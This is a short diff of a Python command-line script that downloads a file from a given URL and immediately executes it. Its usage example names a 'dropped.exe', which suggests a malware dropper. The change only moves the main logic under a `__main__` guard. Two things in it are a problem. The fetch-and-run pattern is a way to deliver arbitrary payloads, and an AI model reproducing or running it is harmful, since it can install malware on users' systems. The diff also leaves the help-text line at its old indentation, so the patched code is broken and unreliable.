@@ -28,18 +28,19 @@ def execute(file):
 
 
 # main
-args = sys.argv
+if __name__ == "__main__":
+	args = sys.argv
 
-if len(args) != 3:
+	if len(args) != 3:
 	help = """ Invalid params. Example:
   script.py <url> <dest>
   script.py https://www.host.com/file.exe dropped.exe"""
-	print(help)
-else:
-	url = args[1] 
-	file = args[2]
+		print(help)
+	else:
+		url = args[1] 
+		file = args[2]
 
-	if (len(url) > 0 and len(file) > 0):
-		download(url, file)
-		execute(file)
+		if (len(url) > 0 and len(file) > 0):
+			download(url, file)
+			execute(file)
 
